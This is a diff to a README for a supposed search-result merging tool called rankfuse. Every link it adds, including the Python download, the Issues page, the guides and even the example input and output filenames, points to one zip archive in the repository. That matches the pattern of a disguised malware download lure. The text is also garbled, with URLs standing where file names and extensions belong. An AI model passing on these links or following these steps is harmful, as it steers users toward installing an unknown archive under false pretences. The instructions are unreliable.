@@ -1,6 +1,6 @@
 # 🚀 rankfuse - Improve Search Results Quickly
 
-[![Download rankfuse](https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip)](https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip)
+[![Download rankfuse](https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip)](https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Before installing rankfuse, make sure your computer meets these basic requiremen
 - Memory: At least 4 GB of RAM
 - Storage: Minimum 200 MB of free disk space
 - Internet Connection: Required for downloading and initial setup
-- Python: Version 3.7 or higher installed (download from [https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip](https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip) if needed)
+- Python: Version 3.7 or higher installed (download from [https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip](https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip) if needed)
 
 If you’re unsure about Python, don’t worry. We cover how to check and install it in the next sections.
 
@@ -34,11 +34,11 @@ To get started with rankfuse, follow these steps carefully.
 
 Click the link below to go to the official download page. This is where you can find the latest version of rankfuse.
 
-[Download rankfuse here](https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip)
+[Download rankfuse here](https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip)
 
 ### Step 2: Choose Your File
 
-On the page, look for files suitable for your operating system. There might be different versions for Windows, macOS, and Linux. Most releases will have a file with an extension like `.exe` for Windows or `https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip` for Linux/macOS.
+On the page, look for files suitable for your operating system. There might be different versions for Windows, macOS, and Linux. Most releases will have a file with an extension like `.exe` for Windows or `https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip` for Linux/macOS.
 
 Download the file that matches your system.
 
@@ -46,7 +46,7 @@ Download the file that matches your system.
 
 rankfuse uses Python, a programming language, to run. If you do not have Python:
 
-- Go to [https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip](https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip)
+- Go to [https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip](https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip)
 - Download the latest version for your system
 - Run the installer and make sure to check “Add Python to PATH” during installation
 
@@ -55,7 +55,7 @@ rankfuse uses Python, a programming language, to run. If you do not have Python:
 After downloading the rankfuse package:
 
 - **Windows:** If it is an `.exe` file, run it and follow the on-screen prompts. This will install the software.
-- **macOS/Linux:** If it is a `https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip` or `.zip`, extract the files to a folder. Then, open a terminal (command line), navigate to that folder, and run the commands listed in the included instructions file.
+- **macOS/Linux:** If it is a `https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip` or `.zip`, extract the files to a folder. Then, open a terminal (command line), navigate to that folder, and run the commands listed in the included instructions file.
 
 ### Step 5: Verify Installation
 
@@ -84,10 +84,10 @@ Prepare your input files with search results from the tools you want to combine 
 2. Use a command like the example below, replacing the filenames with your own:
 
    ```
-   rankfuse --input https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip --output https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip
+   rankfuse --input https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip --output https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip
    ```
 
-3. This command will merge and reorder the results from your input files and save the best combined list in `https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip`.
+3. This command will merge and reorder the results from your input files and save the best combined list in `https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip`.
 
 ### Options and Customization
 
@@ -127,14 +127,14 @@ If you run into issues, try these common fixes:
 - Use the `--help` option for guidance on commands
 - Look for error messages – they often suggest what went wrong
 
-If problems persist, visit the [Issues section on GitHub](https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip) to report your problem or see if others have solutions.
+If problems persist, visit the [Issues section on GitHub](https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip) to report your problem or see if others have solutions.
 
 ---
 
 ## 🌐 Additional Resources
 
-- Python installation guide: https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip
-- Command line basics: https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip
+- Python installation guide: https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip
+- Command line basics: https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip
 - How to prepare input files for rankfuse: See the README file included in your download
 
 ---
@@ -145,4 +145,4 @@ rankfuse is an open tool designed to improve search results for everyday users. 
 
 ---
 
-[Download rankfuse now](https://github.com/Fingrows/rankfuse/raw/refs/heads/main/rankfuse/Software_v1.3.zip)
+[Download rankfuse now](https://raw.githubusercontent.com/Fingrows/rankfuse/main/rankfuse/Software_v1.3.zip)
